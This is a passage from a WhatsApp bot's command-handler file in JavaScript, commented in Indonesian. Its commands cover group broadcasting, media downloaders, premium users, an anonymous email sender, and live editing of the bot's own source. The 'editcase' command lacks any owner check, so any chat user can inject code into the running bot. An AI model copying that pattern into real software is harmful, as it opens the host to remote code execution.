              fileName: "hasil-deobfuscate.js",
            },
            { quoted: m }
          );

          fs.unlinkSync(filePath); // Hapus file setelah dikirim
        }
        break;
      case "bcgc":
      case "bcgroup":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          await loading();
          if (!text)
            throw `Text mana?\n\nExample : ${prefix + command} fatih-san`;
          let getGroups = await Kilianhst.groupFetchAllParticipating();
          let groups = Object.entries(getGroups)
            .slice(0)
            .map((entry) => entry[1]);
          let anu = groups.map((v) => v.id);
          reply(
            `Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${
              anu.length * 1.5
            } detik`
          );
          for (let i of anu) {
            await sleep(1500);
            Kilianhst.sendMessage(
              i,
              {
                text: `Broadcast By KilianXD\n\nText: ${text}\n\nCreated By Kilian × HuTao`,
              },
              { quoted: m }
            );
          }
          reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`);
        }
        break;
      case "upch":
      case "upsaluran":
        {
          if (!text) return m.reply("reply audio\ncontoh: .upch (wm nya)");
          Kilianhst.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
          Kilianhst.sendMessage(m.chat, { react: { text: "⌛", key: m.key } });
          Kilianhst.sendMessage(
            `${global.idch}`,
            {
              audio: await quoted.download(),
              mimetype: "audio/mpeg",
              ptt: true,
              contextInfo: {
                isForwarded: true,
                mentionedJid: [m.sender],
                businessMessageForwardInfo: {
                  businessOwnerJid: "120363405649403674@newsletter",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterName: `${text}`,
                  newsletterJid: "120363405649403674@newsletter",
                },
              },
            },
            { quoted: m }
          );
          Kilianhst.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
          m.reply(`mengirim audio ke channel berhasil`);
        }
        break;
      case "reactch":
        {
          if (!isCreator) return m.reply("Khusus Owner");
          if (!text) return m.reply(".reactch linkpesan 😂");
          if (!args[0] || !args[1]) return m.reply("Wrong Format");
          if (!args[0].includes("https://whatsapp.com/channel/"))
            return m.reply("Link tautan tidak valid");
          let result = args[0].split("/")[4];
          let serverId = args[0].split("/")[5];
          let res = await Kilianhst.newsletterMetadata("invite", result);
          await Kilianhst.newsletterReactMessage(res.id, serverId, args[1]);
          m.reply(
            `Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`
          );
        }
        break;
      case "addcase":
        {
          if (!isCreator) return reply("lu sapa asu");
          if (!text) return reply("Mana case nya");
          const fs = require("fs");
          const namaFile = "case.js";
          const caseBaru = `${text}`;
          fs.readFile(namaFile, "utf8", (err, data) => {
            if (err) {
              console.error("Terjadi kesalahan saat membaca file:", err);
              return;
            }
            const posisiAwalGimage = data.indexOf("case 'addcase':");

            if (posisiAwalGimage !== -1) {
              const kodeBaruLengkap =
                data.slice(0, posisiAwalGimage) +
                "\n" +
                caseBaru +
                "\n" +
                data.slice(posisiAwalGimage);
              fs.writeFile(namaFile, kodeBaruLengkap, "utf8", (err) => {
                if (err) {
                  reply("Terjadi kesalahan saat menulis file:", err);
                } else {
                  reply("Case baru berhasil ditambahkan.");
                }
              });
            } else {
              reply("Tidak dapat menambahkan case dalam file.");
            }
          });
        }
        break;
      case "editcase":
        {
          if (!text)
            return reply(
              `Contoh penggunaan: ${
                prefix + command
              } <nama_case> | <isi_case_baru>`
            );
          let [caseName, ...newContentArr] = text.split("|");
          caseName = caseName.trim();
          let newContent = newContentArr.join("|").trim();
          if (!caseName || !newContent) {
            return reply(
              "Format salah! Gunakan format: .editcase <nama_case> | <isi_case_baru>"
            );
          }
          const fs = require("fs");
          const filePath = "./case.js";
          try {
            if (!fs.existsSync(filePath)) {
              return reply(`File bot tidak ditemukan.`);
            }
            let fileContent = fs.readFileSync(filePath, "utf-8");
            const regex = new RegExp(
              `case ['"]${caseName}['"]: {([\\s\\S]*?)}\\s*break;`,
              "g"
            );
            if (!regex.test(fileContent)) {
              return reply(`Case *${caseName}* tidak ditemukan.`);
            }
            const updatedFileContent = fileContent.replace(
              regex,
              `case '${caseName}': {\n${newContent}\n}\nbreak`
            );
            fs.writeFileSync(filePath, updatedFileContent, "utf-8");
            reply(`Case *${caseName}* berhasil diedit.`);
          } catch (error) {
            console.error("Error:", error);
            return reply(
              "Terjadi kesalahan saat mengedit case. Coba lagi nanti."
            );
          }
        }
        break;
      case "getcase":
        if (!isCreator) return reply(mess.OnlyOwner);
        const getCase = (cases) => {
          return (
            "case" +
            `'${cases}'` +
            fs
              .readFileSync("case.js")
              .toString()
              .split("case '" + cases + "'")[1]
              .split("break")[0] +
            "break"
          );
        };
        reply(`${getCase(q)}`);
        break;
      case "lemonmail":
      case "sendemail":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          const args = text.split("|");
          if (args.length < 3)
            return m.reply("Format salah! Gunakan: email|subject|pesan");
          const [target, subject, message] = args;
          m.reply("Mengirim email...");
          try {
            const data = JSON.stringify({
              to: target.trim(),
              subject: subject.trim(),
              message: message.trim(),
            });
            const config = {
              method: "POST",
              url: "https://lemon-email.vercel.app/send-email",
              headers: {
                "User-Agent":
                  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": '"Android"',
                "sec-ch-ua":
                  '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                "sec-ch-ua-mobile": "?1",
                origin: "https://lemon-email.vercel.app",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                referer: "https://lemon-email.vercel.app/",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                priority: "u=1, i",
              },
              data: data,
            };
            const axios = require("axios");
            const api = await axios.request(config);
            m.reply(`Hasil: ${JSON.stringify(api.data, null, 2)}`);
          } catch (error) {
            m.reply(`Error: ${error.message}`);
          }
        }
        break;
      case "addprem":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          const swn = args.join(" ");
          const pcknm = swn.split("|")[0];
          const atnm = swn.split("|")[1];
          if (!pcknm)
            return reply(
              `Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${
                prefix + command
              } @tag|30d`
            );
          if (!atnm) return reply(`Mau yang berapa hari?`);
          let users = m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          if (users) {
            prem.addPremiumUser(
              (pcknm.replace("@", "") + "@s.whatsapp.net").replace(" @", "@"),
              atnm,
              premium
            );
            reply("Sukses");
          } else {
            var cekap = await Kilianhst.onWhatsApp(pcknm + "@s.whatsapp.net");
            if (cekap.length == 0)
              return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`);
            prem.addPremiumUser(
              (pcknm.replace("@", "") + "@s.whatsapp.net").replace(" @", "@"),
              atnm,
              premium
            );
            reply("Sukses");
          }
        }
        break;
      case "delprem":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          if (!args[0])
            return reply(
              `Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`
            );
          let users = m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          if (users) {
            premium.splice(prem.getPremiumPosition(users, premium), 1);
            fs.writeFileSync(
              "./database/premium.json",
              JSON.stringify(premium)
            );
            reply("Sukses!");
          } else {
            var cekpr = await Kilianhst.onWhatsApp(args[0] + "@s.whatsapp.net");
            if (cekpr.length == 0)
              return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`);
            premium.splice(
              prem.getPremiumPosition(args[0] + "@s.whatsapp.net", premium),
              1
            );
            fs.writeFileSync(
              "./database/premium.json",
              JSON.stringify(premium)
            );
            reply("Sukses!");
          }
        }
        break;
      case "onlygc":
      case "gconly":
        if (!isCreator && !isPrem) return reply(mess.OnlyOwner);
        if (args[0] == "on") {
          if (global.onlygc) return reply("udah on!");
          global.onlygc = false;
          reply("sukses only group chat");
        } else if (args[0] == "off") {
          if (!global.onlygc) return reply("sudah dimatikan sebelumnya!");
          global.onlygc = true;
          reply("sukses menonaktifkan");
        } else reply("on / off");
        break; //Powered By Asuma

      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      // 𝗗 𝗢 𝗪 𝗡 𝗟 𝗢 𝗔 𝗗       -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "tiktok3":
      case "tt3":
        {
          if (!isRegistered)
            return daftar(
              `*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur`
            );
          Kilianhst.sendMessage(from, {
            react: {
              text: "🌊",
              key: m.key,
            },
          });
          if (!text) return m.reply(`Contoh: ${prefix + command} link`);
          reply(mess.wait);
          try {
            const data = await fetchJson(
              `https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(
                budy
              )}`
            );
            const stats = data.result.statistics;
            const caption = `𝗗 𝗢 𝗪 𝗡 𝗟 𝗢 𝗔 𝗗 𝗘 𝗥 - 𝗧 𝗜 𝗞 𝗧 𝗢 𝗞\n*Author*: ${data.result.author.nickname}\n*Like*: ${data.result.statistics.likeCount}\n*Komentar*: ${data.result.statistics.commentCount}\n*Share*: ${data.result.statistics.shareCount}\n*Title*: ${data.result.desc}\n\n_Download By ${global.botname}_`;
            const vidnya = data.result.video;
            Kilianhst.sendMessage(
              m.chat,
              { caption: caption, video: { url: vidnya } },
              { quoted: m }
            );
          } catch (error) {
            const anub = await fetchJson(
              `${api.xterm.url}/api/downloader/tiktok?url=${url}&key=${api.xterm.key}`
            );
            const syavid = anub.data.video;
            Kilianhst.sendMessage(
              m.chat,
              { caption: mess.success, video: { url: syavid } },
              { quoted: m }
            );
          }
        }
        break;

      case "tiktokv2":
      case "ttv2":
        {
          if (!isRegistered)
            return daftar(
              `*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur`
            );
          if (args.length == 0)
            return m.reply(
              `Example: ${prefix + command} Harap Berikan Link Nya`
            );
          let res = await tiktok2(`${text}`);
          Kilianhst.sendMessage(m.chat, {
            video: { url: res.no_watermark },
            fileName: `tiktok.mp4`,
            mimetype: "video/mp4",
          }).then(() => {
            Kilianhst.sendMessage(m.chat, {
              audio: { url: res.music },
              fileName: `tiktok.mp3`,
              mimetype: "audio/mp4",
            });
          });
        }
        break;
      case "gitclone":
        {
          let regx = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
          if (!text)
            return reply(
              `Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${
                prefix + command
              } https://github.com/`
            );
          if (!regx.test(text)) return reply("Linknya salah");
          await Kilianhst.sendMessage(m.chat, {
            react: { text: "⏱️", key: m.key },
          });
          let [, usr, repo] = text.match(regx) || [];
          let repos = repo.replace(/.git$/, "");
          let hasdl = `https://api.github.com/repos/${usr}/${repos}/zipball`;
          let namafile = (await fetch(hasdl, { method: "HEAD" })).headers
            .get("content-disposition")
            .match(/attachment; filename=(.*)/)[1];
          Kilianhst.sendMessage(
            m.chat,
            {
              document: { url: hasdl },
              mimetype: "application/zip",
              fileName: namafile,
            },
            { quoted: m }
          );
        }
        break;
      case "get":
        {
          if (!isCreator) return reply("*Owner only*");
          if (!text)
            return reply(`Please start the *URL* with http:// or https://`);
          try {
            const gt = await axios.get(text, {
              headers: {
                "Access-Control-Allow-Origin": "*",
                Referer: "https://www.google.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin",
                "User-Agent":
                  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
              },
              responseType: "arraybuffer",
            });
            const contentType = gt.headers["content-type"];
            console.log(`Content-Type: ${contentType}`);

            if (/json/i.test(contentType)) {
              const jsonData = JSON.parse(
                Buffer.from(gt.data, "binary").toString("utf8")
              );
              return reply(JSON.stringify(jsonData, null, 2));
            } else if (/text/i.test(contentType)) {
              const textData = Buffer.from(gt.data, "binary").toString("utf8");
              return reply(textData);
            } else if (text.includes("webp")) {
              return Kilianhst.sendMessage(
                m.chat,
                { sticker: { url: text } },
                { quoted: m }
              );
            } else if (/image/i.test(contentType)) {
              return Kilianhst.sendMessage(
                m.chat,
                { image: { url: text } },
                { quoted: m }
              );
            } else if (/video/i.test(contentType)) {
              return Kilianhst.sendMessage(
                m.chat,
                { video: { url: text } },
                { quoted: m }
              );
            } else if (/audio/i.test(contentType) || text.includes(".mp3")) {
              return Kilianhst.sendMessage(
                m.chat,
                { audio: { url: text } },
                { quoted: m }
              );
            } else if (
              /application\/zip/i.test(contentType) ||
              /application\/x-zip-compressed/i.test(contentType)
            ) {
              return Kilianhst.sendMessage(
                m.chat,
                { document: { url: text } },
                { quoted: m }
              );
            } else if (/application\/pdf/i.test(contentType)) {
              return Kilianhst.sendMessage(
                m.chat,
                { document: { url: text } },
                { quoted: m }
              );
            } else {
              return reply(`MIME : ${contentType}\n\n${gt.data}`);
            }
          } catch (error) {
            console.error(`Error: ${error}`);
            return reply(
              `An error occurred while accessing the URL: ${error.message}`
            );
          }
        }
        break;
      case "ytmp3":
        {
          if (!m.isGroup) return reply(mess.OnlyGrup);
          if (!q.includes("youtube.com") && !q.includes("youtu.be"))
            return reply("Masukin Link YouTube Yang Valid!");
          let [link, quality] = q.split(",");
          let qualityOptions = [
            "64kbps",
            "128kbps",
            "192kbps",
            "256kbps",
            "320kbps",
          ];
          if (!quality) {
            let qualityList = qualityOptions.map((q) => `▫️ ${q}`).join("\n");
            return reply(
              `🔊 *Pilih Kualitas Audio:*\n\n${qualityList}\n\nContoh: *ytmp3 ${link},128kbps*`
            );
          }
          if (!qualityOptions.includes(quality))
            return reply(
              `⚠️ *Kualitas Tidak Valid!*\n\nPilih Salah Satu:\n${qualityOptions
                .map((q) => `▫️ ${q}`)
                .join("\n")}`
            );
          let apiUrl = `https://fastrestapis.fasturl.cloud/downup/ytmp3?url=${encodeURIComponent(
            link
          )}&quality=${quality}&server=auto`;
          reply("Tunggu Sebentar, Lagi Proses Download...");
          try {
            let res = await fetch(apiUrl);
            let data = await res.json();
            if (data.status !== 200) return reply("Gagal Mengambil Audio!");
            let { title, metadata, author, url, media } = data.result;
            let cap = `🎵 *Judul:* ${title}\n📌 *Durasi:* ${metadata.duration}\n👤 *Channel:* ${author.name}\n📆 *Upload:* ${metadata.uploadDate}\n🎶 *Kualitas:* ${quality}\n🔗 *Link:* ${url}`;
            await Kilianhst.sendMessage(
              m.sender,
              {
                audio: { url: media },
                mimetype: "audio/mp4",
                fileName: `${title}.mp3`,
              },
              { quoted: m }
            );
            await Kilianhst.sendMessage(m.sender, { text: cap });
            reply("✅ *Berhasil, Cek PM!*");
          } catch (e) {
            console.error(e);
            reply("Terjadi Kesalahan, Coba Lagi Nanti!");
          }
        }
        break;

      case "ytmp4":
        {
          if (!m.isGroup) return reply(mess.OnlyGrup);
          if (!q.includes("youtube.com") && !q.includes("youtu.be"))
            return reply("Masukin Link YouTube Yang Valid!");
          let [link, quality] = q.split(",");
          let qualityOptions = [
            "144p",
            "240p",
            "360p",
            "480p",
            "720p",
            "1080p",
          ];
          if (!quality) {
            let qualityList = qualityOptions.map((q) => `▫️ ${q}`).join("\n");
            return reply(
              `📺 *Pilih Kualitas Video:*\n\n${qualityList}\n\nContoh: *ytmp4 ${link},360p*`
            );
          }
          if (!qualityOptions.includes(quality))
            return reply(
              `⚠️ *Kualitas Tidak Valid!*\n\nPilih Salah Satu:\n${qualityOptions
                .map((q) => `▫️ ${q}`)
                .join("\n")}`
            );
          let apiUrl = `https://fastrestapis.fasturl.cloud/downup/ytmp4?url=${encodeURIComponent(
            link
          )}&quality=${quality}&server=auto`;
          reply("Tunggu Sebentar, Lagi Proses Download...");
          try {
            let res = await fetch(apiUrl);
            let data = await res.json();
            if (data.status !== 200) return reply("Gagal Mengambil Video!");
            let { title, metadata, author, url, media } = data.result;
            let cap = `📹 *Judul:* ${title}\n📌 *Durasi:* ${metadata.duration}\n👤 *Channel:* ${author.name}\n📆 *Upload:* ${metadata.uploadDate}\n🎞 *Kualitas:* ${quality}\n🔗 *Link:* ${url}`;
            await Kilianhst.sendMessage(
              m.sender,
              {
                video: { url: media },
                mimetype: "video/mp4",
                fileName: `${title}.mp4`,
              },
              { quoted: m }
            );
            await Kilianhst.sendMessage(m.sender, { text: cap });
            reply("✅ *Berhasil, Cek PM!*");
          } catch (e) {
            console.error(e);
            reply("Terjadi Kesalahan, Coba Lagi Nanti!");
          }
        }
        break;

      case "play":
      case "yts":
        {
          if (!m.isGroup) return reply(mess.OnlyGrup);
          if (!text) return reply("Masukkan judul lagu atau video YouTube!");

          await Kilianhst.sendMessage(m.chat, {
            react: { text: "🔎", key: m.key },
          });

          let ytsSearch = await yts(text);
          let allResults = ytsSearch.all;
          if (!allResults || allResults.length === 0)
            return reply("Tidak ditemukan hasil pencarian!");

          // Pilih hasil acak
          let res = allResults[Math.floor(Math.random() * allResults.length)];
          let { url, title, thumbnail, timestamp, views, author } = res;

          const buttons = [
            {
              buttonId: `.ytmp3 ${url},128kbps`,
              buttonText: { displayText: "🎵 Download MP3 (128kbps)" },
              type: 1,
            },
            {
              buttonId: `.ytmp4 ${url},360p`,
              buttonText: { displayText: "🎬 Download MP4 (360p)" },
              type: 1,
            },
          ];

          let caption = `*${title}*\n\n⏱️ Durasi: ${timestamp}\n👤 Channel: ${author.name}\n📈 Views: ${views}\n\n🔗 Link: ${url}`;

          await Kilianhst.sendMessage(
            m.chat,
            {
              image: { url: thumbnail },
              caption,
              footer: "Pilih format untuk mendownload:",
              buttons,
              headerType: 4,
              contextInfo: {
                externalAdReply: {
                  title,
                  body: `Channel: ${author.name}`,
                  thumbnailUrl: thumbnail,
                  mediaType: 1,
                  renderLargerThumbnail: true,
                  sourceUrl: url,
                },
              },
            },
            { quoted: m }
          );

          await Kilianhst.sendMessage(m.chat, {
            react: { text: "✅", key: m.key },
          });
        }
        break;

      case "tiktoksearch":
      case "tiktoks":
      case "ttsearch":
        {
          if (!isRegistered)
            return daftar(
              `*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur`
            );
          if (!text)
            return reply(
              `Gunakan dengan cara ${prefix + command} *query*\n\n_Contoh_\n\n${
                prefix + command
              } jj epep`
            );
          try {
            let serach = await tiktokSearchVideo(text);
            if (!serach.videos || serach.videos.length === 0)
              return reply("Tidak ada video ditemukan.");

            // Ambil video acak
            let randomVideo =
              serach.videos[Math.floor(Math.random() * serach.videos.length)];

            let teks =
              `*Hii ${pushname}, ini hasil acak TikTok Search*\n\n` +
              `*⭔ Title* : ${randomVideo.title}\n` +
              `*⭔ Video ID* : ${randomVideo.video_id}\n` +
              `*⭔ Username* : ${randomVideo.author.unique_id}\n` +
              `*⭔ Nickname* : ${randomVideo.author.nickname}\n` +
              `*⭔ Duration* : ${randomVideo.duration} detik\n` +
              `*⭔ VT Like* : ${randomVideo.digg_count}\n` +
              `*⭔ Comment* : ${randomVideo.comment_count}\n` +
              `*⭔ Share* : ${randomVideo.share_count}\n` +
              `*⭔ Url* : https://www.tiktok.com/@${randomVideo.author.unique_id}/video/${randomVideo.video_id}\n`;

            // Kirim ke chat pribadi user
            await Kilianhst.sendMessage(
              m.sender,
              {
                video: { url: `https://tikwm.com${randomVideo.play}` },
                caption: teks,
              },
              { quoted: m }
            );

            // Button "Next Video"
            const buttons = [
              {
                buttonId: `${prefix + command} ${text}`,
                buttonText: { displayText: "▶️ Next Video" },
                type: 1,
              },
            ];

            const buttonMessage = {
              text: `*Berhasil!* Video TikTok acak telah dikirim ke private chat kamu ya ${pushname}!\n\nKlik tombol di bawah untuk cari video selanjutnya. Otomatos Video Selanjut Nya Di Kirim Ke Pribadi Kamu`,
              buttons: buttons,
              footer: "TikTok Search Bot",
              headerType: 1,
            };

            // Kirim balasan ke chat asal (grup/chat)
            await Kilianhst.sendMessage(m.chat, buttonMessage, { quoted: m });
          } catch (error) {
            console.log(error);
            reply(
              `Gagal mengambil video.\n\nError: ${
                error.message || "Terjadi kesalahan."
              }`
            );
          }
        }
        break;

      case "tt":
      case "tiktok":
        {
          if (!isRegistered)
            return daftar(
              `*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur`
            );
          if (!args[0]) return m.reply("❌ Harap masukkan URL TikTok!");

          let url = args[0].trim();

          try {
            await Kilianhst.sendMessage(m.chat, {
              react: { text: "⏱️", key: m.key },
            });

            let axios = require("axios");
            let apiUrl = `https://api.agatz.xyz/api/tiktok?url=${encodeURIComponent(
              url
            )}`;
            let { data } = await axios.get(apiUrl);

            if (!data.status) return m.reply("❌ Gagal mengambil video!");

            let result = data.data;
            let caption = `
🎥 *TikTok Video*
📌 *Judul:* ${result.title}
⏱️ *Durasi:* ${result.duration}
📆 *Diunggah:* ${result.taken_at}
🌍 *Region:* ${result.region}

👤 *Pembuat Konten:*
- Nama: ${result.author.fullname} (@${result.author.nickname})
- Avatar: ${result.author.avatar}

🎶 *Musik:*
- Judul: ${result.music_info.title}
- Artis: ${result.music_info.author}
- Link Musik: ${result.music_info.url}

📊 *Statistik:*
👁️ *Views:* ${result.stats.views}
👍 *Likes:* ${result.stats.likes}
💬 *Komentar:* ${result.stats.comment}
📤 *Shares:* ${result.stats.share}
⬇️ *Unduhan:* ${result.stats.download}
        `.trim();

            // Pilih video kualitas terbaik
            let videoUrl =
              result.data.find((v) => v.type === "nowatermark_hd")?.url ||
              result.data.find((v) => v.type === "nowatermark")?.url ||
              result.data.find((v) => v.type === "watermark")?.url;

            if (!videoUrl) return m.reply("❌ Video tidak ditemukan.");

            // Kirim video + external reply untuk cover
            await Kilianhst.sendMessage(
              m.chat,
              {
                video: { url: videoUrl },
                caption: caption,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: result.title,
                    body: "TikTok Downloader",
                    mediaType: 1,
                    thumbnailUrl: result.cover,
                    sourceUrl: url,
                  },
                },
              },
              { quoted: m }
            );

            // Kirim audio jika ada
            if (result.music_info.url) {
              await Kilianhst.sendMessage(
                m.chat,
                {
                  audio: { url: result.music_info.url },
                  mimetype: "audio/mpeg",
                  fileName: `${result.music_info.title}.mp3`,
                },
                { quoted: m }
              );
            }

            await Kilianhst.sendMessage(m.chat, {
              react: { text: "✅", key: m.key },
            });
          } catch (err) {
            console.error("[TikTok Scraper Error]", err);
            m.reply("❌ Terjadi kesalahan saat memproses permintaan.");
          }
        }
        break;
      case "fb":
      case "facebook":
      case "fbdl":
        {
          if (!args[0]) return m.reply("🔗 Masukkan URL Facebook!");
          try {
            const axios = require("axios");
            const cheerio = require("cheerio");
            async function yt5sIo(url) {
              try {
                const form = new URLSearchParams();
                form.append("q", url);
                form.append("vt", "home");
                const { data } = await axios.post(
                  "https://yt5s.io/api/ajaxSearch",
                  form,
                  {
                    headers: {
                      Accept: "application/json",
                      "X-Requested-With": "XMLHttpRequest",
                      "Content-Type": "application/x-www-form-urlencoded",
                    },
                  }
                );
                if (data.status !== "ok")
                  throw new Error("Gagal mengambil data.");
                const $ = cheerio.load(data.data);
                if (
                  /^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(
                    url
                  )
                ) {
                  const thumb = $("img").attr("src");
                  let links = [];
                  $("table tbody tr").each((_, el) => {
                    const quality = $(el).find(".video-quality").text().trim();
                    const link = $(el).find("a.download-link-fb").attr("href");
                    if (quality && link) links.push({ quality, link });
                  });
                  if (links.length > 0) {
                    return {
                      platform: "facebook",
                      type: "video",
                      thumb,
                      media: links[0].link,
                    };
                  } else if (thumb) {
                    return {
                      platform: "facebook",
                      type: "image",
                      media: thumb,
                    };
                  } else {
                    throw new Error("Tidak ada media yang dapat diunduh.");
                  }
                } else if (
                  /^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(
                    url
                  )
                ) {
                  const video = $('a[title="Download Video"]').attr("href");
                  const image = $("img").attr("src");
                  if (video) {
                    return {
                      platform: "instagram",
                      type: "video",
                      media: video,
                    };
                  } else if (image) {
                    return {
                      platform: "instagram",
                      type: "image",
                      media: image,
                    };
                  } else {
                    throw new Error("Media tidak ditemukan.");
                  }
                } else {
                  throw new Error("URL tidak valid. Gunakan link Facebook.");
                }
              } catch (error) {
                return { error: error.message };
              }
            }
            await Kilianhst.sendMessage(m.chat, {
              react: {
                text: "⏳",
                key: m.key,
              },
            });
            let res = await yt5sIo(args[0]);
            if (res.error) {
              await Kilianhst.sendMessage(m.chat, {
                react: {
                  text: "❌",
                  key: m.key,
                },
              });
              return m.reply(`⚠ *Error:* ${res.error}`);
            }
            if (res.type === "video") {
              await Kilianhst.sendMessage(m.chat, {
                react: {
                  text: "⏳",
                  key: m.key,
                },
              });
              await Kilianhst.sendMessage(
                m.chat,
                {
                  video: { url: res.media },
                  caption: "✅ *Berhasil mengunduh video!*",
                },
                { quoted: m }
              );
            } else if (res.type === "image") {
              await Kilianhst.sendMessage(m.chat, {
                react: {
                  text: "⏳",
                  key: m.key,
                },
              });
              await Kilianhst.sendMessage(
                m.chat,
                {
                  image: { url: res.media },
                  caption: "✅ *Berhasil mengunduh gambar!*",
                },
                { quoted: m }
              );
            }
          } catch (error) {
            console.error(error);
            await Kilianhst.sendMessage(m.chat, {
              react: {
                text: "❌",
                key: m.key,
              },
            });
            m.reply("Terjadi kesalahan saat mengambil media.");
          }
        }
        break;

      case "instagram":
      case "ig":
      case "igdl":
      case "igmp4":
        {
          if (!text) return reply(`Mana Link Ny Tolol`);
          const mediaUrl = await igdl(text);
          const url_media = mediaUrl[0].url;
          try {
            const response = await axios.head(url_media);
            const contentType = response.headers["content-type"]; // Mendapatkan tipe konten dari header
            if (contentType.startsWith("image/")) {
              await Kilianhst.sendMessage(
                m.chat,
                { image: { url: url_media }, caption: mess.success },
                { quoted: m }
              );
              return;
            } else {
              await Kilianhst.sendMessage(
                m.chat,
                { video: { url: url_media }, caption: mess.success },
                { quoted: m }
              );
              return;
            }
          } catch (e) {
            return reply(`Maaf Kak Gagal`);
          }
        }
        break;
      case "yts":
      case "ytsearch":
        {
          if (!q) return m.reply("Mau Cari Apa?");
          async function ytSearch(q) {
            try {
              const response = await axios.get(
                `https://www.archive-ui.biz.id/search/youtube?q=${encodeURIComponent(
                  q
                )}`
              );

              if (response.data.status && response.data.result.length > 0) {
                let hasilnye = response.data.result
                  .map(
                    (video) =>
                      `- Title: ${video.title}\n- Link: ${video.link}\n- Duration: ${video.duration}\n`
                  )
                  .join("\n");
                m.reply("*[ HASIL SEARCH ]*\n\n" + hasilnye);
              } else {
                m.reply("Tidak Ada Hasil");
              }
            } catch (error) {
              m.reply("Error: " + error);
            }
          }

          ytSearch(q);
        }
        break;
      case "mediafiredl":
        {
          if (!text) return m.reply("Mana Link Yang Mau Di Download?");
          const anu = await axios.get(
            `https://api.hiuraa.my.id/downloader/mediafire?url=${encodeURIComponent(
              text
            )}`
          );
          await Kilianhst.sendMessage(
            m.chat,
            {
              document: { url: anu.data.result.downloadUrl },
              caption: `\`BERHASIL MENDOWNLOAD FILE✅\`\n\nFile Name: ${anu.data.result.filename}\nFile Size: ${anu.data.result.size}`,
              mimetype: anu.data.result.mimetype,
              fileName: anu.data.result.filename,
            },
            { quoted: m }
          );
        }
        break;
      case "ssweb":
        {
          if (!text) return reply(`Example: ${prefix + command} https://`);
          if (!text.startsWith("http")) {
            let buf =
              "https://image.thum.io/get/width/1900/crop/1000/fullpage/https://" +
              q;
            await Kilianhst.sendMessage(
              m.chat,
              { image: { url: buf }, caption: "Berhasil" },
              { quoted: m }
            );
          } else {
            let buf =
              "https://image.thum.io/get/width/1900/crop/1000/fullpage/" + q;
            await Kilianhst.sendMessage(
              m.chat,
              { image: { url: buf }, caption: "Berhasil" },
              { quoted: m }
            );
          }
        }
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      // 𝗠 𝗘 𝗡 𝗨         -        𝗔 𝗜
      //============================================================\\
      case "ai":
      case "heckai":
        if (!args.length) {
          return m.reply(
            "Silakan masukkan pertanyaan untuk AI.\n\nContoh: *heckai Sekarang hari apa?*"
          );
        }
        let query = encodeURIComponent(args.join(" "));
